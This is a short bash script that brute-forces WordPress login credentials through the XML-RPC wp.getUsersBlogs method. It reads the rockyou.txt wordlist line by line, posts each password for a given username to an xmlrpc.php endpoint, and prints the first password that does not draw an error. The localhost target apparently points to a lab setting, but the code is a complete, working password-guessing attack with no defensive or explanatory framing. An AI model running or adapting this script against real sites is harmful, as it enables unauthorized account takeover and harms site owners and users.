#!/bin/bash

ctrl_c ()
{
  echo -e "\n\n[x] Exiting.."
  exit 1
}

# Ctrl+C 
trap ctrl_c SIGINT

createXML ()
{
  password=$1
  user=$2
  xmlFile="""
  <?xml version=\"1.0\" encoding=\"UTF-8\"?>
  <methodCall> 
    <methodName>wp.getUsersBlogs</methodName> 
      <params> 
          <param><value>$user</value></param> 
          <param><value>$password</value></param> 
      </params> 
  </methodCall>
  """

  echo $xmlFile > file.xml
  response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml)
  if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
    echo -e "\n[+] The password for  $user is $password."
    exit 0
  fi
}

declare -i correct=0

while getopts ":u:" arg; do
    case $arg in
      u) user=$OPTARG; let correct+=1;;
    esac
done

if [ $correct -eq 1 ]; then
  cat /usr/share/wordlists/rockyou.txt | while read password; do 
    createXML $password $user
  done
else
  echo -e "\n[!] Wrong execution command."
fi
